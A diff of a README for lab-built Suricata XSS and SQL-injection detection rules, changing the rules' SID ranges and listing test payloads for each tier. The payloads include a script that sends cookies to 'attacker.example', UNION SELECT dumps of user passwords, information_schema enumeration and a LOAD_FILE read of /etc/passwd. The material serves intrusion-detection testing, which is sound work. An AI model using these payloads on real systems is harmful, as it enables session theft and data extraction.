@@ -8,10 +8,10 @@ Team-authored Suricata rules for XSS and SQL-injection detection. The lab runs t
 
 | File | Rules | SID range |
 |------|-------|-----------|
-| `xss_alerts.rules` | 58 | `1000001-1000058` |
-| `sqli_alerts.rules` | 13 | `1000101-1000113` |
+| `xss_alerts.rules` | 58 | `1002001-1002058` |
+| `sqli_alerts.rules` | 13 | `1001001-1001013` |
 
-Both files sit in the standard user-rule range (`1000000-1999999`), clear of the ET Open reserved range (`2000000-2999999`).
+Both files sit in the standard user-rule range (`1000000-1999999`), clear of the ET Open reserved range (`2000000-2999999`). SQLi uses `1001xxx` and XSS uses `1002xxx` so the two sets never collide.
 
 ---
 
@@ -37,9 +37,9 @@ Both rulesets use a three-tier `priority:` scheme. Suricata maps `priority:N` to
 
 | Tier | SIDs | Behaviour matched |
 |------|------|--------------------|
-| P1 | 1000101-1000104 | Confirmed exploit / extraction: `UNION SELECT` (URI + POST), DB function calls (`version()`, `database()`, `user()`, `schema()`), OS-command primitives (`xp_cmdshell`, `LOAD_FILE`, `INTO OUTFILE/DUMPFILE`). |
-| P2 | 1000105-1000109 | Clear injection structure: boolean-blind (`OR 1=1`), time-blind (`SLEEP`, `WAITFOR DELAY`, `pg_sleep`, `BENCHMARK`), comment sequences (`--`, `#`, `/*`), `information_schema` enumeration. |
-| P3 | 1000110-1000113 | Wide net: SQL keyword + quote combinations in URI / POST / headers, URL-encoded SQLi characters. |
+| P1 | 1001001-1001004 | Confirmed exploit / extraction: `UNION SELECT` (URI + POST), DB function calls (`version()`, `database()`, `user()`, `schema()`), OS-command primitives (`xp_cmdshell`, `LOAD_FILE`, `INTO OUTFILE/DUMPFILE`). |
+| P2 | 1001005-1001009 | Clear injection structure: boolean-blind (`OR 1=1`), time-blind (`SLEEP`, `WAITFOR DELAY`, `pg_sleep`, `BENCHMARK`), comment sequences (`--`, `#`, `/*`), `information_schema` enumeration. |
+| P3 | 1001010-1001013 | Wide net: SQL keyword + quote combinations in URI / POST / headers, URL-encoded SQLi characters. |
 
 ---
 
@@ -100,41 +100,41 @@ sudo tail -f /var/log/suricata/eve.json \
 ### XSS payloads - target a reflected XSS endpoint
 
 ```text
-# P1 cookie exfiltration via fetch - fires sid 1000001/1000002
+# P1 cookie exfiltration via fetch - fires sid 1002001/1002002
 <script>fetch('http://attacker.example/?c='+document.cookie)</script>
 
-# P1 script + eval - fires sid 1000015-1000017
+# P1 script + eval - fires sid 1002015-1002017
 <script>eval('alert(1)')</script>
 
-# P2 URL-encoded script tag - fires sid 1000040
+# P2 URL-encoded script tag - fires sid 1002040
 %3Cscript%3Ealert(1)%3C%2Fscript%3E
 
-# P3 img with onerror - fires sid 1000055/1000057
+# P3 img with onerror - fires sid 1002055/1002057
 <img src=x onerror=alert(1)>
 ```
 
 ### SQLi payloads - target a SQL injection endpoint (`?id=<payload>`)
 
 ```text
-# P1 UNION SELECT - fires sid 1000101
+# P1 UNION SELECT - fires sid 1001001
 1' UNION SELECT user, password FROM users#
 
-# P1 DB function call - fires sid 1000103
+# P1 DB function call - fires sid 1001003
 1' AND version()#
 
-# P1 OS command primitive - fires sid 1000104
+# P1 OS command primitive - fires sid 1001004
 1' UNION SELECT LOAD_FILE('/etc/passwd')#
 
-# P2 boolean-blind - fires sid 1000105 (and 1000108 for comment)
+# P2 boolean-blind - fires sid 1001005 (and 1001008 for comment)
 1' OR 1=1#
 
-# P2 time-blind - fires sid 1000106
+# P2 time-blind - fires sid 1001006
 1' OR SLEEP(5)#
 
-# P2 information_schema enumeration - fires sid 1000109 (and 1000101)
+# P2 information_schema enumeration - fires sid 1001009 (and 1001001)
 1' UNION SELECT table_name,1 FROM information_schema.tables#
 
-# P3 keyword + quote - fires sid 1000110
+# P3 keyword + quote - fires sid 1001010
 1' SELECT 1
 ```
 
